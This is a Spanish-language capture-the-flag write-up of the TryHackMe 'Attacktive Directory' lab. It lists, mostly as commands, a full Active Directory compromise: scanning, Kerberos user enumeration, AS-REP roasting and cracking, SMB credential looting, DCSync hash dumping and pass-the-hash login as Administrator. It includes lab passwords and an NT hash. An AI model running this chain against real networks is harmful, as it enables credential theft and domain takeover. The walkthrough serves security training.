---
title: "attacktivedirectory"
description: "attacktivedirectory"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/attacktivedirectory

# Fase de reconocimiento

Windows

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.209.100
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605175535.png)

## Reconocimiento de servicios

````
nmap -sCV -p53,80,88,135,139,445,464,3269,3389,49664,49665,49667,49669,49671 10.10.209.100
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605174129.png)

## Enumeration SMB

````
nmap --script "rdp-enum-encryption or rdp-ntlm-info" -p3389 -T4 10.10.209.100
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605174712.png)

````
enum4linux -a spookysec.local
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605180741.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605180811.png)

## kerberos enumeracion ususarios

Nos descargamos la tool y descargamos un userlist dado

````
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605223652.png)

# Fase de ataque

Conseguimos un TGT (Ticket) de un usuario para intentar crackearlo

````
impacket-GetNPUsers -request -format john -no-pass spookysec.local/svc-admin
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605223959.png)
Crakeamos con John

````
john --wordlist=passwordlist.txt hash.txt
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605224238.png)
Vemos si funciona

````
crackmapexec smb spookysec.local -u 'svc-admin' -p 'management2005'
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605224648.png)

## SMB

Listamos shares compartidas

````
crackmapexec smb spookysec.local -u 'svc-admin' -p 'management2005' --shares
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605225056.png)
Vemos la share de backup

````
smbclient \\\\spookysec.local\\backup -U svc-admin --password="management2005"
````

Contiene las credenciales de backup

````
	get <archivo>
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605225536.png)
Comprobamos la contraseña

````
base64 -d backup_credentials.txt
````

````
crackmapexec smb spookysec.local -u 'backup' -p 'backup2517860'
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605230804.png)

## PassTheHash

El usuario backup tiene permiso para sacar los hashes

````
impacket-secretsdump -just-dc backup@spookysec.local
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240605230904.png)
Copiamos el NTHash

````
0e0363213e37b94221497260b0bcb4fc
````

Comprobamos
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240607193036.png)
Nos conectamos con el hash

````
evil-winrm -ip spookysec.local -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc
````

\[+\] ==pwned!==
